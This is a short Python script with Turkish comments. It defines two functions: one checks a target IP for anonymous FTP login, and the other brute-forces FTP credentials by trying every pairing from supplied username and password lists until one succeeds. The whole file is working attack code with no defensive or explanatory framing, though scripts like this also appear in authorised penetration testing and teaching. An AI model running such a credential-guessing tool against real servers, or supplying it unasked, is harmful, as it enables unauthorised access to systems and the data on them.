from ftplib import FTP

# FTP anonim girişi kontrol et
def check_anonymous_access(ip):
    try:
        ftp = FTP(ip)
        ftp.login()  # anonim giriş
        print(f"[ FTP ] {ip} adresinde anonim giriş başarılı.")
        ftp.quit()
        return True
    except Exception as e:
        print(f"[ FTP ] {ip} adresinde anonim giriş başarısız: {e}")
        return False

# FTP brute-force denemesi yap
def ftp_brute_force(ip, username_list, password_list):
    for username in username_list:
        for password in password_list:
            try:
                ftp = FTP(ip)
                ftp.login(user=username, passwd=password)
                print(f"[ FTP ] Başarılı giriş: {username}:{password} -> {ip}")
                ftp.quit()
                return username, password
            except Exception:
                continue
    print("[ FTP ] Giriş başarısız.")
    return None
